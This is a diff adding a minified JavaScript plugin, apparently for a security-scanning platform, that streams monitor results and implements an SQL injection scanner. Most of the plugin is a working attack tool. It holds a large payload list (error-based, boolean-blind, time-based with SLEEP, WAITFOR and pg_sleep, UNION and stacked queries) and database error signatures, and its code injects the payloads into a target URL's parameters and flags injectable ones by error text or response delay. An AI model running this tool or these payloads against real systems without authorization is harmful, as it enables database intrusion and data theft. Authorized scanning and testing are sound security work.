+targets);const chunkSize=positiveLimit(stream.max_work_items,MAX_WORK_ITEMS,"max_work_items");const maxPending=positiveLimit(stream.max_pending_commits,2,"max_p\
+ending_commits");const byteLimit=positiveLimit(stream.max_bytes,MAX_JSON_BYTES,"max_bytes");const completed=new Set;const pending=new Set;const bufferedKeys=new Set;
+let buffered=[];let workContentsBytes=0;let sequence=0;let lastCommitAt=Date.now();let failed;let finished=false;let serialization=Promise.resolve();let committedItems=0;
+let submittedBatches=0;let maxPendingObserved=0;let backpressureMs=0;let submittedJsonBytes=0;let committedJsonBytes=0;let maxBatchJsonBytes=0;function assertHealthy(){
+if(failed)throw failed;if(finished)throw new Error("Monitor result stream is already finished")}function latch(error){failed||(failed=error instanceof Error?error:
+new Error(String(error)));return failed}async function capacity(){const start=Date.now();while(pending.size>=maxPending){await Promise.race(pending);if(failed)throw failed}
+backpressureMs+=Date.now()-start;if(failed)throw failed}async function flush(){assertHealthy();if(!buffered.length)return;await capacity();const request={sequence:sequence+
+1,work:buffered};const encodedBytes=monitorRequestBytes(request.sequence,workContentsBytes);if(encodedBytes>byteLimit)throw new Error("Monitor result batch exce\
+eds the JSON byte limit");sequence++;const keys=buffered.map(item=>JSON.stringify([item.target,item.key]));buffered=[];workContentsBytes=0;lastCommitAt=Date.now();
+submittedBatches++;submittedJsonBytes+=encodedBytes;maxBatchJsonBytes=Math.max(maxBatchJsonBytes,encodedBytes);let commit;commit=Promise.resolve().then(async()=>{
+const ack=await monitor.commitResults(request);if(ack?.ok!==true||ack.sequence!==request.sequence){throw new Error(`Monitor result commit ${request.sequence} wa\
+s not acknowledged`)}committedItems+=request.work.length;committedJsonBytes+=encodedBytes}).catch(error=>{latch(error)}).finally(()=>{for(const key of keys)bufferedKeys.
+delete(key);pending.delete(commit)});pending.add(commit);maxPendingObserved=Math.max(maxPendingObserved,pending.size);await capacity()}function exclusive(action){
+const operation=serialization.then(action).catch(error=>{throw latch(error)});serialization=operation.then(()=>{},()=>{});return operation}async function record(target,key,output,options={}){
+return exclusive(async()=>{assertHealthy();if(typeof target!=="string"||!expected.has(target))throw new Error("Monitor work target is not owned by this executio\
+n");if(typeof key!=="string"||!key||key.length>2048)throw new Error("Monitor work key must contain 1 to 2048 characters");if(completed.has(target))throw new Error(
+"Monitor work cannot follow a completed target");const identity=JSON.stringify([target,key]);if(bufferedKeys.has(identity))throw new Error("Monitor work repeats\
+ an unacknowledged target/key");const status=options.status??"ok";if(!["ok","failed","skipped"].includes(status))throw new Error("Invalid monitor work status");
+const delta=copyMonitorDelta(output);if(status!=="ok"&&isJsonObject(delta.value.snapshots)&&Object.keys(delta.value.snapshots).length){throw new Error("Only suc\
+cessful work may update snapshots")}if(isJsonObject(delta.value.snapshots)&&Object.keys(delta.value.snapshots).length&&options.snapshot_complete!==true){throw new Error(
+"Snapshot updates require an explicitly complete observation")}const item={target,key,status,complete:options.complete!==false,output:{success:true,data:delta.value}};
+if(options.error!==void 0)item.error=options.error;if(options.failure_category!==void 0)item.failure_category=options.failure_category;if(options.snapshot_complete!==
+void 0)item.snapshot_complete=options.snapshot_complete;const itemBytes=jsonBytes(item);if(monitorRequestBytes(sequence+1,itemBytes)>byteLimit){throw new Error(
+"A single monitor work result exceeds the JSON byte limit")}let combinedWorkBytes=workContentsBytes+(buffered.length?1:0)+itemBytes;if(buffered.length&&monitorRequestBytes(
+sequence+1,combinedWorkBytes)>byteLimit){await flush();combinedWorkBytes=itemBytes}buffered.push(item);workContentsBytes=combinedWorkBytes;bufferedKeys.add(identity);
+if(item.complete)completed.add(target);if(buffered.length>=chunkSize||Date.now()-lastCommitAt>=COMMIT_INTERVAL_MS)await flush()})}async function finish(finalOutput){
+return exclusive(async()=>{assertHealthy();await flush();await Promise.all(pending);if(failed)throw failed;const finalRecord=isJsonObject(finalOutput)?finalOutput:
+void 0;if(finalRecord?.success===false){throw new Error(typeof finalRecord.error==="string"&&finalRecord.error?finalRecord.error:"Monitor plugin reported an uns\
+uccessful execution")}if(completed.size!==expected.size){throw new Error(`Monitor result stream ended before all targets completed (${completed.size}/${expected.
+size})`)}const finalDiagnostics=finalRecord&&isJsonObject(finalRecord.data)&&isJsonObject(finalRecord.data.summary)&&isJsonObject(finalRecord.data.summary.diagnostics)?
+finalRecord.data.summary.diagnostics:{};const pluginMetrics=Object.fromEntries(Object.entries(finalDiagnostics).filter(([,value])=>typeof value==="number"&&Number.
+isFinite(value)&&value>=0));finished=true;return{success:true,data:{stream_complete:true,summary:{diagnostics:{...pluginMetrics,submitted_json_bytes:submittedJsonBytes,
+committed_json_bytes:committedJsonBytes,max_batch_json_bytes:maxBatchJsonBytes,committed_work_items:committedItems,completed_targets:completed.size,submitted_batches:submittedBatches,
+max_pending_commits:maxPendingObserved,backpressure_ms_sum:backpressureMs}}}}})}return{enabled:true,assertHealthy,record,finish}}var aliases=["targets","urls","url","domains","domain","ips","ip"];var activeScope;function observedFetch(input,init){const scope=activeScope;if(!scope)return globalThis.
+fetch(input,init);const key=`http:${++scope.sequence}`;const operation=(async()=>{scope.stream.assertHealthy();let response;try{response=await globalThis.fetch(
+input,init)}catch(error){await scope.stream.record(scope.target,key,{success:true,data:{results:[{kind:"http_observation",success:false}]}},{status:"failed",complete:false,
+error:String(error).slice(0,2048),failure_category:"network_other"});throw error}await scope.stream.record(scope.target,key,{success:true,data:{results:[{kind:"\
+http_observation",success:true,statusCode:response.status,method:String(init?.method||"GET")}]}},{complete:false});return response})();scope.pending.add(operation);
+void operation.finally(()=>scope.pending.delete(operation)).catch(()=>{});return operation}async function runMonitorTool(input,schema,business){const stream=createMonitorResultStream(
+input);if(activeScope)throw new Error("A monitored business scope is already active");if(!stream.enabled)return await business(input);try{const properties=schema?.
+properties||{};const supported=aliases.filter(key=>Object.prototype.hasOwnProperty.call(properties,key));if(!supported.length)throw new Error("Monitor business \
+schema must declare a standard target input");const targets=input.__monitorExecution.result_stream.targets;for(const target of targets){stream.assertHealthy();const ordinary={
+...input};delete ordinary.__monitorExecution;for(const key of aliases){if(!supported.includes(key))delete ordinary[key];else ordinary[key]=["url","domain","ip"].
+includes(key)?target:[target]}let result;const scope={target,stream,sequence:0,pending:new Set};activeScope=scope;try{result=await business(ordinary)}catch(error){
+result={success:false,error:error instanceof Error?error.message:String(error)}}finally{while(scope.pending.size)await Promise.allSettled([...scope.pending]);activeScope=
+void 0}stream.assertHealthy();if(!result||typeof result.success!=="boolean")throw new Error("Monitor business must return a ToolOutput");const success=result.success===
+true;const data={results:[{target,output:result}]};await stream.record(target,"complete",{success:true,data},{status:success?"ok":"failed",complete:true,snapshot_complete:success,
+...success?{}:{error:String(result.error||"Business observation failed")}})}return await stream.finish()}catch(error){const failure={success:false,error:error instanceof
+Error?error.message:String(error)};try{return await stream.finish(failure)}catch(saveError){return{success:false,error:saveError instanceof Error?saveError.message:
+String(saveError)}}}}function monitorToolOutputSchema(business){const terminalData={type:"object",required:["stream_complete","summary"],properties:{stream_complete:{
+const:true},summary:{type:"object"}}};const terminal={type:"object",required:["success","data"],properties:{success:{const:true},data:terminalData}};const failure={
+type:"object",required:["success","error"],properties:{success:{const:false},error:{type:"string",minLength:1}}};return{type:"object",required:["success"],properties:{
+success:{type:"boolean",description:"Execution outcome"},data:{type:"object",description:"Business output or acknowledged monitor completion",properties:{stream_complete:{
+type:"boolean"},summary:{type:"object"}}},error:{type:"string",description:"Execution failure"}},anyOf:[business,terminal,failure]}}var pluginGlobals=globalThis;var DEFAULT_CONCURRENCY=3;var SQL_ERROR_PATTERNS={mysql:[/SQL syntax.*?MySQL/i,/Warning.*?mysql_/i,/MySQLSyntaxErrorException/i,/valid MySQL result/i,/check the manual that corresponds to your MySQL server version/i,
+/MySqlClient\./i,/com\.mysql\.jdbc/i,/Unclosed quotation mark after the character string/i,/SQLSTATE\[42000\]/i,/mysql_fetch_array\(\)/i,/mysql_num_rows\(\)/i,/MySQL Query fail/i],
+postgresql:[/PostgreSQL.*?ERROR/i,/Warning.*?pg_/i,/valid PostgreSQL result/i,/Npgsql\./i,/PG::SyntaxError/i,/org\.postgresql\.util\.PSQLException/i,/ERROR:\s+syntax error at or near/i,
+/ERROR: parser: parse error at or near/i,/PostgreSQL query failed/i,/PSQLException/i],mssql:[/Driver.*? SQL[\-\_\ ]*Server/i,/OLE DB.*? SQL Server/i,/\bSQL Server[^&lt;&quot;]+Driver/i,
+/Warning.*?mssql_/i,/\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}/i,/System\.Data\.SqlClient\.SqlException/i,/Exception.*?\WSystem\.Data\.SqlClient\./i,/Exception.*?\WRoadhouse\.Cms\./i,
+/Microsoft SQL Native Client error '[0-9a-fA-F]{8}/i,/\[SQL Server\]/i,/ODBC SQL Server Driver/i,/ODBC Driver \d+ for SQL Server/i,/SQLServer JDBC Driver/i,/com\.microsoft\.sqlserver\.jdbc/i,
+/macabordar\.telefonicamovistar\.com/i,/Unclosed quotation mark after the character string/i],oracle:[/\bORA-[0-9][0-9][0-9][0-9]/i,/Oracle error/i,/Oracle.*?Driver/i,
+/Warning.*?oci_/i,/Warning.*?ora_/i,/oracle\.jdbc\.driver/i,/quoted string not properly terminated/i,/SQL command not properly ended/i],sqlite:[/SQLite\/JDBCDriver/i,
+/SQLite\.Exception/i,/System\.Data\.SQLite\.SQLiteException/i,/Warning.*?sqlite_/i,/Warning.*?SQLite3::/i,/\[SQLITE_ERROR\]/i,/SQLite error \d+:/i,/sqlite3\.OperationalError:/i,
+/SQLite3::SQLException/i,/org\.sqlite\.JDBC/i,/SQLiteException/i],generic:[/SQL syntax/i,/syntax error/i,/mysql_fetch/i,/num_rows/i,/Incorrect syntax near/i,/Unclosed quotation mark/i,
+/quoted string not properly terminated/i,/You have an error in your SQL syntax/i,/supplied argument is not a valid/i,/Division by zero/i,/ODBC.*?Driver/i,/Error Executing Database Query/i,
+/DB2 SQL error/i,/Sybase message/i,/Ingres SQLSTATE/i,/Informix ODBC Driver/i]};var SQLI_PAYLOADS={error_based:[{payload:"'",technique:"error",dbType:"generic"},
+{payload:'"',technique:"error",dbType:"generic"},{payload:"'--",technique:"error",dbType:"generic"},{payload:'"--',technique:"error",dbType:"generic"},{payload:"\
+' OR '1'='1",technique:"error",dbType:"generic"},{payload:'" OR "1"="1',technique:"error",dbType:"generic"},{payload:"' OR '1'='1'--",technique:"error",dbType:"\
+generic"},{payload:"' OR '1'='1'/*",technique:"error",dbType:"generic"},{payload:"1' AND '1'='1",technique:"error",dbType:"generic"},{payload:'1" AND "1"="1',technique:"\
+error",dbType:"generic"},{payload:"' AND 1=1--",technique:"error",dbType:"generic"},{payload:"' AND 1=2--",technique:"error",dbType:"generic"},{payload:"admin'-\
+-",technique:"error",dbType:"generic"},{payload:"') OR ('1'='1",technique:"error",dbType:"generic"},{payload:"')) OR (('1'='1",technique:"error",dbType:"generic"},
+{payload:"' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",technique:"error",dbType:"mysql"},{payload:"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOO\
+R(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",technique:"error",dbType:"mysql"},{payload:"' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",technique:"\
+error",dbType:"mysql"},{payload:"' AND 1=CONVERT(int,@@version)--",technique:"error",dbType:"mssql"},{payload:"'; WAITFOR DELAY '0:0:0'--",technique:"error",dbType:"\
+mssql"},{payload:"' AND 1=CAST(VERSION() AS INT)--",technique:"error",dbType:"postgresql"},{payload:"'::int",technique:"error",dbType:"postgresql"},{payload:"' \
+AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--",technique:"error",dbType:"oracle"}],blind_boolean:[{payload:"' AND 1=1--",technique:"\
+blind-boolean",dbType:"generic"},{payload:"' AND 1=2--",technique:"blind-boolean",dbType:"generic"},{payload:"' AND 'a'='a",technique:"blind-boolean",dbType:"ge\
+neric"},{payload:"' AND 'a'='b",technique:"blind-boolean",dbType:"generic"},{payload:"1' AND 1=1--",technique:"blind-boolean",dbType:"generic"},{payload:"1' AND\
+ 1=2--",technique:"blind-boolean",dbType:"generic"},{payload:"' OR 1=1--",technique:"blind-boolean",dbType:"generic"},{payload:"' OR 1=2--",technique:"blind-boo\
+lean",dbType:"generic"},{payload:"1 AND 1=1",technique:"blind-boolean",dbType:"generic"},{payload:"1 AND 1=2",technique:"blind-boolean",dbType:"generic"}],time_based:[
+{payload:"' AND SLEEP(5)--",technique:"time-based",dbType:"mysql"},{payload:"' OR SLEEP(5)--",technique:"time-based",dbType:"mysql"},{payload:"1' AND SLEEP(5)--",
+technique:"time-based",dbType:"mysql"},{payload:"' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",technique:"time-based",dbType:"mysql"},{payload:"' AND BENCHMARK(5\
+000000,SHA1('test'))--",technique:"time-based",dbType:"mysql"},{payload:"'; WAITFOR DELAY '0:0:5'--",technique:"time-based",dbType:"mssql"},{payload:"' WAITFOR \
+DELAY '0:0:5'--",technique:"time-based",dbType:"mssql"},{payload:"1; WAITFOR DELAY '0:0:5'--",technique:"time-based",dbType:"mssql"},{payload:"' AND pg_sleep(5)\
+--",technique:"time-based",dbType:"postgresql"},{payload:"'; SELECT pg_sleep(5)--",technique:"time-based",dbType:"postgresql"},{payload:"1' AND pg_sleep(5)--",technique:"\
+time-based",dbType:"postgresql"},{payload:"' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",technique:"time-based",dbType:"oracle"},{payload:"' AND 1=DBMS_PIPE.RECEIVE\
+_MESSAGE('a',5)--",technique:"time-based",dbType:"oracle"},{payload:"' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--",technique:"time-based",dbType:"\
+sqlite"}],union_based:[{payload:"' UNION SELECT NULL--",technique:"union",dbType:"generic"},{payload:"' UNION SELECT NULL,NULL--",technique:"union",dbType:"gene\
+ric"},{payload:"' UNION SELECT NULL,NULL,NULL--",technique:"union",dbType:"generic"},{payload:"' UNION SELECT 1--",technique:"union",dbType:"generic"},{payload:"\
+' UNION SELECT 1,2--",technique:"union",dbType:"generic"},{payload:"' UNION SELECT 1,2,3--",technique:"union",dbType:"generic"},{payload:"' UNION ALL SELECT NUL\
+L--",technique:"union",dbType:"generic"},{payload:"' UNION ALL SELECT NULL,NULL--",technique:"union",dbType:"generic"},{payload:"1' UNION SELECT NULL--",technique:"\
+union",dbType:"generic"},{payload:"1' UNION SELECT 1,2,3--",technique:"union",dbType:"generic"},{payload:"') UNION SELECT NULL--",technique:"union",dbType:"gene\
+ric"},{payload:"')) UNION SELECT NULL--",technique:"union",dbType:"generic"}],stacked:[{payload:"'; SELECT 1--",technique:"stacked",dbType:"generic"},{payload:"\
+'; SELECT @@version--",technique:"stacked",dbType:"mssql"},{payload:"'; SELECT version()--",technique:"stacked",dbType:"mysql"},{payload:"'; SELECT version()--",
+technique:"stacked",dbType:"postgresql"}]};function get_input_schema(){return{type:"object",required:["url"],properties:{url:{type:"string",description:"Target \
+URL to test for SQL injection vulnerabilities"},method:{type:"string",enum:["GET","POST","PUT","PATCH"],description:"HTTP method to use",default:"GET"},params:{
+type:"object",description:"URL parameters to test (key-value pairs)",additionalProperties:{type:"string"}},headers:{type:"object",description:"Custom headers to\
+ include",additionalProperties:{type:"string"}},body:{type:"string",description:"Request body (for POST/PUT/PATCH)"},contentType:{type:"string",description:"Con\
+tent-Type header",default:"application/x-www-form-urlencoded"},userAgent:{type:"string",description:"Custom User-Agent header"},testErrorBased:{type:"boolean",description:"\
+Test for error-based SQL injection",default:true},testBlind:{type:"boolean",description:"Test for blind boolean-based SQL injection",default:true},testTimeBased:{
+type:"boolean",description:"Test for time-based blind SQL injection",default:true},testUnion:{type:"boolean",description:"Test for UNION-based SQL injection",default:true},
+dbType:{type:"string",enum:["auto","mysql","postgresql","mssql","oracle","sqlite"],description:"Target database type (auto for detection)",default:"auto"},customPayloads:{
+type:"array",items:{type:"string"},description:"Custom SQL injection payloads to test"},dictionaryId:{type:"string","x-control":"dictionary-picker","x-dictionar\
+y-type":"sql_injection_payload",description:"Dictionary ID or name for SQLi payloads"},timeThreshold:{type:"integer",description:"Time threshold in ms for time-\
+based detection",default:5e3,minimum:3e3,maximum:3e4}}}}pluginGlobals.get_input_schema=get_input_schema;function getBusinessOutputSchema(){return{type:"object",
+properties:{success:{type:"boolean",description:"Whether the operation succeeded"},data:{type:"object",properties:{url:{type:"string",description:"Target URL"},
+method:{type:"string"},tests:{type:"array",items:{type:"object",properties:{parameter:{type:"string"},payload:{type:"string"},technique:{type:"string"},vulnerable:{
+type:"boolean"},confidence:{type:"string"},dbType:{type:"string"},evidence:{type:"string"}}},description:"SQL injection test results"},summary:{type:"object",properties:{
+totalTests:{type:"integer"},vulnerableCount:{type:"integer"},vulnerableParameters:{type:"array",items:{type:"string"}},detectedDbTypes:{type:"array",items:{type:"\
+string"}}}}}},error:{type:"string",description:"Error message if failed"}}}}pluginGlobals.get_output_schema=get_output_schema;function extractParameters(url,body,contentType,providedParams){
+const params=new Map;if(providedParams){for(const[key,value]of Object.entries(providedParams)){params.set(key,{value,location:"provided"})}}try{const urlObj=new URL(
+url);urlObj.searchParams.forEach((value,key)=>{if(!params.has(key)){params.set(key,{value,location:"query"})}})}catch{const match=url.match(/\?(.+)/);if(match){
+match[1].split("&").forEach(pair=>{const[key,...rest]=pair.split("=");if(key&&!params.has(key)){params.set(key,{value:decodeURIComponent(rest.join("=")),location:"\
+query"})}})}}if(body){if(contentType?.includes("application/json")){try{const json=JSON.parse(body);const flatten=(obj,prefix="")=>{for(const[key,value]of Object.
+entries(obj)){const fullKey=prefix?`${prefix}.${key}`:key;if(typeof value==="object"&&value!==null&&!Array.isArray(value)){flatten(value,fullKey)}else if((typeof value===
+"string"||typeof value==="number")&&!params.has(fullKey)){params.set(fullKey,{value:String(value),location:"body"})}}};flatten(json)}catch{}}else{body.split("&").
+forEach(pair=>{const[key,...rest]=pair.split("=");if(key&&!params.has(key)){params.set(key,{value:decodeURIComponent(rest.join("=")),location:"body"})}})}}return params}
+function buildTestUrl(baseUrl,paramName,payload){try{const url=new URL(baseUrl);url.searchParams.set(paramName,payload);return url.toString()}catch{const separator=baseUrl.
+includes("?")?"&":"?";return`${baseUrl}${separator}${encodeURIComponent(paramName)}=${encodeURIComponent(payload)}`}}function buildTestBody(originalBody,paramName,payload,contentType){
+if(contentType?.includes("application/json")){try{const json=JSON.parse(originalBody||"{}");const parts=paramName.split(".");let current=json;for(let i=0;i<parts.
+length-1;i++){if(!current[parts[i]])current[parts[i]]={};current=current[parts[i]]}current[parts[parts.length-1]]=payload;return JSON.stringify(json)}catch{return originalBody||
+""}}else{const params=new URLSearchParams(originalBody||"");params.set(paramName,payload);return params.toString()}}function detectSqlError(body){for(const[dbType,
+patterns]of Object.entries(SQL_ERROR_PATTERNS)){for(const pattern of patterns){const match=body.match(pattern);if(match){const index=body.indexOf(match[0]);const start=Math.
+max(0,index-50);const end=Math.min(body.length,index+match[0].length+50);return{detected:true,dbType:dbType==="generic"?"unknown":dbType,evidence:body.substring(
+start,end)}}}}return{detected:false,dbType:"",evidence:""}}function compareResponses(baseline,test){if(baseline===test)return 1;if(baseline.length===0||test.length===
+0)return 0;const lengthDiff=Math.abs(baseline.length-test.length);const maxLength=Math.max(baseline.length,test.length);const lengthSimilarity=1-lengthDiff/maxLength;
+return lengthSimilarity}async function runWithConcurrency(tasks,concurrency){if(tasks.length===0){return[]}const limit=Math.max(1,Math.min(concurrency,tasks.length));
+const results=new Array(tasks.length);let nextIndex=0;const workers=Array.from({length:limit},async()=>{while(true){const index=nextIndex++;if(index>=tasks.length){
+return}results[index]=await tasks[index]()}});await Promise.all(workers);return results}function fetchTimeoutForTechnique(technique,timeThreshold){if(technique===
+"time-based"){return Math.max(timeThreshold+2e3,8e3)}return 1e4}async function loadPayloads(dictionaryId,customPayloads,testErrorBased,testBlind,testTimeBased,testUnion,targetDbType){
+const payloads=[];if(customPayloads&&customPayloads.length>0){for(const p of customPayloads){payloads.push({payload:p,technique:"custom",dbType:"generic"})}}if(dictionaryId){
+try{if(typeof Sentinel!=="undefined"&&Sentinel.Dictionary){const words=await Sentinel.Dictionary.getWords(dictionaryId);if(words&&words.length>0){for(const p of words){
+payloads.push({payload:p,technique:"dictionary",dbType:"generic"})}return payloads}}}catch(e){console.debug(`Failed to load SQLi dictionary: ${e}`)}}const filterByDb=items=>{
+if(!targetDbType||targetDbType==="auto")return items;return items.filter(i=>!i.dbType||i.dbType==="generic"||i.dbType===targetDbType)};if(testErrorBased!==false){
+payloads.push(...filterByDb(SQLI_PAYLOADS.error_based))}if(testBlind!==false){payloads.push(...filterByDb(SQLI_PAYLOADS.blind_boolean))}if(testTimeBased!==false){
+payloads.push(...filterByDb(SQLI_PAYLOADS.time_based))}if(testUnion!==false){payloads.push(...filterByDb(SQLI_PAYLOADS.union_based))}const uniquePayloads=new Map;
+for(const payload of payloads){const key=`${payload.technique}:${payload.dbType||"generic"}:${payload.payload}`;if(!uniquePayloads.has(key)){uniquePayloads.set(
+key,payload)}}return Array.from(uniquePayloads.values())}async function analyzeBusiness(input){const startTime=performance.now();try{if(!input.url||typeof input.
+url!=="string"){return{success:false,error:"Invalid input: url parameter is required"}}let baseUrl=input.url;if(!baseUrl.startsWith("http://")&&!baseUrl.startsWith(
+"https://")){baseUrl=`https://${baseUrl}`}const method=(input.method||"GET").toUpperCase();const userAgent=input.userAgent||"Mozilla/5.0 (Windows NT 10.0; Win64\
+; x64) AppleWebKit/537.36";const contentType=input.contentType||"application/x-www-form-urlencoded";const timeThreshold=input.timeThreshold||5e3;const params=extractParameters(
+baseUrl,input.body,contentType,input.params);if(params.size===0){return{success:false,error:"No parameters found to test. Provide params or use a URL with query\
+ parameters."}}const payloads=await loadPayloads(input.dictionaryId,input.customPayloads,input.testErrorBased,input.testBlind,input.testTimeBased,input.testUnion,
+input.dbType);const tests=[];const vulnerableParams=new Set;const detectedDbTypes=new Set;const compromisedParams=new Set;const baselines=new Map;await runWithConcurrency(
+Array.from(params.entries()).map(([paramName,{value,location}])=>async()=>{try{let testUrl=baseUrl;let testBody=input.body;if(location==="query"||location==="pr\
+ovided"){testUrl=buildTestUrl(baseUrl,paramName,value)}const headers={"User-Agent":userAgent,Accept:"*/*",...input.headers};if(method!=="GET"&&testBody){headers["\
+Content-Type"]=contentType}const startReq=performance.now();const response=await observedFetch(testUrl,{method,headers,body:method!=="GET"?testBody:void 0,timeout:1e4});
+const baselineTime=Math.round(performance.now()-startReq);const body=await response.text();baselines.set(paramName,{body,time:baselineTime})}catch{}return null}),
+DEFAULT_CONCURRENCY);const tasks=[];for(const[paramName,{value,location}]of params){const baseline=baselines.get(paramName);for(const{payload,technique,dbType}of payloads){
+tasks.push(async()=>{if(compromisedParams.has(paramName)){return null}const testStart=performance.now();try{let testUrl=baseUrl;let testBody=input.body;const testValue=value+
+payload;if(location==="query"||location==="provided"){testUrl=buildTestUrl(baseUrl,paramName,testValue)}else if(location==="body"){testBody=buildTestBody(input.
+body,paramName,testValue,contentType)}const headers={"User-Agent":userAgent,Accept:"*/*",...input.headers};if(method!=="GET"&&testBody){headers["Content-Type"]=
+contentType}const response=await observedFetch(testUrl,{method,headers,body:method!=="GET"?testBody:void 0,timeout:fetchTimeoutForTechnique(technique,timeThreshold)});
+const responseTime=Math.round(performance.now()-testStart);const body=await response.text();if(technique==="error"||technique==="custom"||technique==="dictionar\
+y"){const errorResult=detectSqlError(body);if(errorResult.detected){compromisedParams.add(paramName);return{parameter:paramName,location,payload,technique:"erro\
+r-based",vulnerable:true,confidence:"high",evidence:errorResult.evidence.substring(0,300),dbType:errorResult.dbType,responseCode:response.status,responseTime,baselineTime:baseline?.
+time}}}if(technique==="time-based"&&baseline){const timeDiff=responseTime-baseline.time;if(timeDiff>=timeThreshold-1e3){compromisedParams.add(paramName);return{
+parameter:paramName,location,payload,technique:"time-based",vulnerable:true,confidence:timeDiff>=timeThreshold?"high":"medium",evidence:`Response delayed by ${timeDiff}\
+ms (baseline: ${baseline.time}ms, test: ${responseTime}ms)`,dbType:dbType||"unknown",responseCode:response.status,responseTime,baselineTime:baseline.time}}}if(technique===
+"blind-boolean"&&baseline){const similarity=compareResponses(baseline.body,body);if(similarity<.8&&response.status===200){return null}}return null}catch(e){return null}})}}
+const results=await runWithConcurrency(tasks,DEFAULT_CONCURRENCY);for(const result of results){if(result&&result.vulnerable){tests.push(result);vulnerableParams.
+add(result.parameter);if(result.dbType&&result.dbType!=="unknown"){detectedDbTypes.add(result.dbType)}}}const uniqueTests=new Map;for(const test of tests){const key=`${test.
+parameter}:${test.technique}`;const existing=uniqueTests.get(key);if(!existing||test.confidence==="high"&&existing.confidence!=="high"){uniqueTests.set(key,test)}}
+const finalTests=Array.from(uniqueTests.values());return{success:true,data:{url:baseUrl,method,tests:finalTests,summary:{totalTests:tasks.length,vulnerableCount:finalTests.
+length,testedParameters:Array.from(params.keys()),vulnerableParameters:Array.from(vulnerableParams),detectedDbTypes:Array.from(detectedDbTypes)}}}}catch(error){
+return{success:false,error:error instanceof Error?error.message:String(error)}}}pluginGlobals.analyze=analyze;function get_output_schema(){return monitorToolOutputSchema(
+getBusinessOutputSchema())}async function analyze(input){return await runMonitorTool(input,get_input_schema(),analyzeBusiness)}export{analyze,get_input_schema,get_output_schema};
+globalThis.get_input_schema=get_input_schema; globalThis.get_output_schema=get_output_schema; globalThis.analyze=analyze;
